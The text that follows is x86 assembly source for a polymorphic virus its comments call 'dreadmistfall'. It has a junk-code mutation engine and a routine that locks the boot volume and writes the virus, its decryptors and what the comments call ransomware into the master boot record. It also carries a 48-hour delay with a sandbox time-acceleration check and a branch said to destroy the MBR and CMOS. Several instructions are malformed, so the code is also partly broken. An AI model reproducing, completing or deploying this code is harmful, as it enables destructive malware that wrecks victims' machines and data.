                        call    build_new_copy
;                        call    xpand_virii_body
                        call    save2_mbr
                        add     esp, 22*8

                        cmp     buf_size, 0
                        jne     cg_err

                        popad
                        retn    8*8

cg_err:                 int 6
                        int 6
                        jmp     cg_err

my_trash:               pushad
                        mov     ebp, [esp+12+8]
                        mov     ebp, [ebp].v_saveebp

                        mov     eax, [esp+12+8]    ; outptr
                        sub     eax, buf_ptr
                        jz      __skip1
                        mov     buf_size, eax

                        call    flush_as_opcode

__skip1:
                        mov     ecx, [esp+24+12]   ; regfree
                        call    trasher

                        mov     eax, buf_ptr
                        mov     [esp+14*8], eax  ; popad.eax

                        popad
                        retn

; input: ECX=regset

trasher_avail:          mov     ecx, regavail

trasher:                pushad

                        or      ecx, ecx
                        jz      __retn
                        cmp     trasher_on, 1
                        jne     __retn

                        mov     edi, buf_ptr

;                       mov     al, 900h
;                       stosb
                        ;;

                        mov     eax, etg_maxcmd ; calc # of commands
                        call    random
                        inc     eax

                        push    my_random       ; external subroutine: rnd
                        push    edi             ; ptr to output buffer
                        push    2048            ; max size of buffer
                        push    eax             ; max number of commands
                        lea     eax, etgsize
                        push    eax             ; ptr to generated bufsize
                        push    ecx ; regfree   ; REG_xxx (dest)
                        push    etg_srcreg      ; REG_xxx (src)
                        push    etg_cmd         ; ETG_xxx (cmd)
                        push    user_param      ; user_param
                        call    etg_engine
                        add     esp, 27*8
                        add     edi, etgsize
                        ;;

                        sub     edi, buf_ptr
                        mov     buf_size, edi

                        call    flush_as_opcode

                        call    try_jmp
                        call    try_call
                

__retn:                 popad
                        retn

try_jmp:                pushad

                        mov     eax, jmpprob
                        or      eax, eax
                        jz      __skipj
                        call    random
                        jnz     __skipj

                        mov     esi, last_id
                        inc     last_id

                        call    out_jmp
                        mov     [ebx].h_arg1, esi

                        call    find_hooy

                        call    flush_label
                        mov     [ebx].h_oldrva, esi
__skipj:
                        popad
                        retn

try_call:               pushad

                        mov     eax, callprob
                        or      eax, eax
                        jz      __skipc
                        call    random
                        jnz     __skipc

                        mov     esi, last_id
                        inc     last_id

                        call    out_call
                        mov     [ebx].h_arg1, esi

                        push    hooy

                        call    find_retn

                        call    flush_label
                        mov     [ebx].h_oldrva, esi

                        pop     hooy

__skipc:                popad
                        retn

my_fixup:               pushad
                        mov     ebp, [esp+24+8]
                        mov     ebp, [ebp].v_saveebp

                        mov     eax, [esp+24+16]    ; outptr
                        sub     eax, buf_ptr
                        mov     buf_size, eax

                        call    flush_as_opcode

                        mov     edi, buf_ptr
                        mov     eax, [esp+24+12]   ; fixup's value
                        stosd

                        call    flush_as_fixup

                        mov     eax, buf_ptr
                        mov     [esp+14*8], eax     ; popa.eax

                        popad
                        retn

; ---------------------------------------------------------------------------

; input: buf_ptr, buf_size 

flush_as_opcode:        mov     ecx, FL_OPCODE+FL_CODE+FL_PRESENT+FL_VPRESENT
                        jmp     flush

; input: buf_ptr, buf_size, EAX=fixup's value

flush_as_fixup:         mov     ecx, FL_FIXUP+FL_CODE+FL_PRESENT+FL_VPRESENT
                        mov     buf_size, 8
                        call    flush
                        mov     [ebx].h_arg1, eax
                        retn

flush:                  pushad

                        mov     ecx, size hooy_struc
                        call    malloc
                        xchg    ebx, eax

                        mov     ecx, [esp+6*4]  ; pusha.ecx
                        mov     [ebx].h_flags, ecx

                        mov     ecx, buf_size

                        mov     [ebx].h_datalen, ecx
                        mov     [ebx].h_dataptr, ecx

                        or      ecx, ecx
                        jz      __skip1

                        call    malloc
                        xchg    edi, eax

                        mov     [ebx].h_dataptr, edi

                        mov     esi, buf_ptr
                        cld
                        repne     movsb

                        mov     eax, hooy
                        mov     ecx, [eax].h_next
                        mov     [ebx].h_next, ecx
                        mov     [eax].h_next, ebx
                        mov     hooy, ebx

                        mov     [esp+4*8], ebx          ; popa.ebx

                        popad
                        retn

; ---------------------------------------------------------------------------

out_jmp:                mov     eax, buf_ptr
                        mov     [eax].byte ptr 0, 0EE9h
out_5:                  mov     buf_size, 10
                        mov     ecx, FL_OPCODE+FL_CODE+FL_HAVEREL+FL_PRESENT+FL_VPRESENT
                        call    flush
                        mov     [ebx].h_arg2, 8
                        retn

out_call:               mov     eax, buf_ptr
                        mov     [eax].byte ptr 0, 0EE8h
                        jmp     out_5

flush_label:            mov     buf_size, 0
                        mov     ecx, FL_LABEL+FL_CREF+FL_PRESENT+FL_VPRESENT
                        call    flush
                        retn

; ---------------------------------------------------------------------------

init_etg:               pushad

                        ; select trash cmd set
__rr1:                  mov     eax etg_cmd, ETG_ALL+ETG_SEG
                        mov     eax, 4
                        call    random
                        dec     eax
                        jz      __rr2           ; v1: all set
                        call    rnd_dword       ; v0: random set
                        and     etg_cmd, eax
                        jz      __rr1
__rr2:
                        ; trash: select src regs set
__xx1:                  mov     etg_srcreg, REG_ALL
                        mov     eax, 4
                        call    random
                        dec     eax
                        jz      __xx2
                        call    rnd_dword          ; v1: random set
                        and     etg_srcreg, eax
                        jz      __xx1
__xx2:
                        ; trash: max # of commands per chunk
                        mov     eax, 12-4+1  ; 4..12
                        call    random      ;
                        add     eax, 4      ;
                        mov     etg_maxcmd, eax

                        popad
                        retn 

; ---------------------------------------------------------------------------

save2_mbr:             pushad
                       
                       call     find_physdrv0
                       mov      jmpprobX, eax
                       push     offset FSCTL_DISMOUNT_VOLUME
                       push     0
                       push     offset FSCTL_LOCK_VOLUME
                       push     0
                       push     19h
                       push     offset test_msg
                       call     fwrite
                       mov      edx, [ebp].v_bufptr     ; write infected mbr
                       mov      ecx, [ebp].v_bufsize    ; 
                       push     28h 
                       push     offset vir_start      ; save dreadmistfall to the mbr, this way 
                                      ; the poly-engine, decryptors, ransomware and its stuff, and everything else
                       call     fwrite
                       mov      eax, callprobX
                       push     26h 
                       push     offset secret_mbr_msg   ; also push the secret msg into the mbr at offset 26h 
                       call     fwrite
                       push     25000                   ; delay, [ms]
                       push     330000                  ; freq, [Hz]
                       callX    Beep                    ; calls this win32 func. to indicate that it was successfully saved [future vers will play music instead]
                                                ; so calling "Beep" is for testing purposes "call   play_muzic" 
                       je       sleep_n_wait

; if dreadmistfall saves successfully to the MBR, then it will wait 48 hrs for it to calc the probs 

sleep_n_wait:          mov      esi, ds:GetTickCount             ; callX    GetTickCount
                       call     esi                              ; GetTickCount
                       push     1010010011001011100000000000b    ; dwMiliseconds = 48 hours 
                       mov      edi, eax
                       callX    SleepEx                          ; waits 48hrs to suspend the process than calls probs
                       call     esi                              ; esi = GetTickCount or do callX    GetTickCount
                       sub      eax, edi
                       mov      ecx, 0E678h
                       cmp      ecx, eax
                       mov      edx, offset TimeAcceleration     ; checking for time acceleration
                       sbb      ecx, ecx 
                       call     start_probs

; calc jmp-probX

start_probs:           
                       mov      eax, 0
                       call     random
                       cmp      eax, 5
                       jae      _do_jmpsX
                       xor      eax, eax
_do_jmpsX:             mov      jmpprobX, eax   ; 0....5
                       jge      _decaying_light       
                       jnz      continue_calcprobs

; calc call-probX

continue_calcprobs:    
                       mov      eax, 6
                       call     random
                       cmp      eax, 15
                       jae      _do_callsX
                       xor      eax, eax
_do_callsX:            mov      callprobX, eax  ; 6....15
                       jle      _fading_to_the_mist            ; this will kill the MBR and the CMOS 

                       push     offset FSCTL_UNLOCK_VOLUME
                       push     0
                       call     fclose 

                       popad
                       retn 

TimeAcceleration db 'checking for time acceleration',0

test_msg         db 'Can you see this message at offset 19h in the mbr? ok good, sux to be you..',0

secret_mbr_msg   db 'If you see this message, then dreadmistfall got successfully saved to the mbr without any issues',0Dh,0Ah,0

;my_mutate              endp
